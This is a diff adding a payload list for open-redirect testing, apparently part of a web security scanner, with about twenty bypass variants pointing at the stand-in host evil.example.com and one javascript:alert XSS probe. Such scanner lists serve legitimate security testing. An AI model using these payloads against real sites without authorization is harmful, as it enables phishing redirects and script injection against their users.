@@ -1,0 +1,20 @@
+# Open Redirect payloads — flagged when the response redirects to evil.example.com.
+# One payload per line. # comments ignored. Add your own freely.
+https://evil.example.com
+https://evil.example.com/
+//evil.example.com
+//evil.example.com/
+/\evil.example.com
+/\/evil.example.com
+https:/evil.example.com
+https:evil.example.com
+\/\/evil.example.com
+https://evil.example.com/%2f..
+http://evil.example.com
+//evil.example.com/%2e%2e
+/%09/evil.example.com
+/%5cevil.example.com
+https://target.com.evil.example.com
+https://evil.example.com#@target.com
+https://evil.example.com?target.com
+javascript:alert(document.domain)
